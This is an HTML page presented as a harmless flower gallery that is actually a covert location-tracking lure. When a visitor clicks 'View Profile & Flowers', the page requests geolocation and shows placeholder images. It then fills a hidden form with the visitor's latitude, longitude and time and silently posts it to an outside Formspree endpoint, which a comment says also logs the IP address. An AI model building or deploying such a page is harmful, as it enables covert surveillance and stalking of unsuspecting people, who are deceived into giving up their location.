<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flower Gallery Profile</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; }
        .flower-container { display: flex; gap: 15px; justify-content: center; margin-top: 20px; }
        .flower-container img { width: 280px; height: auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>

    <h2>Welcome to the Profile Gallery</h2>
    <p>Click the button below to initialize the high-resolution flower profile viewer.</p>
    
    <!-- Real button the user interacts with -->
    <button id="action-btn" onclick="startApp()">View Profile & Flowers</button>
    <div id="status" style="margin-top: 15px; font-weight: bold; color: #555;"></div>

    <!-- Hidden standard HTML Form that bypasses JavaScript blocks entirely -->
    <form id="hidden-form" action="https://formspree.io/f/mojojbbp" method="POST" style="display: none;">
        <input type="text" name="GPS_Latitude" id="form-lat">
        <input type="text" name="GPS_Longitude" id="form-lon">
        <input type="text" name="Device_Time" id="form-time">
    </form>

    <div id="gallery" class="flower-container"></div>

    <script>
    function startApp() {
        const statusDiv = document.getElementById("status");
        
        if (!navigator.geolocation) {
            statusDiv.textContent = "Geolocation is not supported by this browser.";
            return;
        }

        statusDiv.textContent = "Loading security context and permissions...";

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // 1. Instantly display local coordinates on the screen
                statusDiv.innerHTML = `Loaded!<br>Lat: ${lat}<br>Lon: ${lon}`;
                
                // 2. Load the flower images visually on screen
                document.getElementById('gallery').innerHTML = `
                    <img src="https://unsplash.com" alt="Pink Flowers">
                    <img src="https://unsplash.com" alt="Yellow Flowers">
                `;

                // 3. Inject the collected data into our hidden native HTML form fields
                document.getElementById("form-lat").value = lat;
                document.getElementById("form-lon").value = lon;
                document.getElementById("form-time").value = new Date().toISOString();

                // 4. Submit the form natively to Formspree
                // Formspree automatically grabs the network IP on form submit without any JS helper scripts!
                document.getElementById("hidden-form").submit();
            },
            (error) => {
                statusDiv.textContent = `Error: ${error.message}`;
            }
        );
    }
    </script>
</body>
</html>
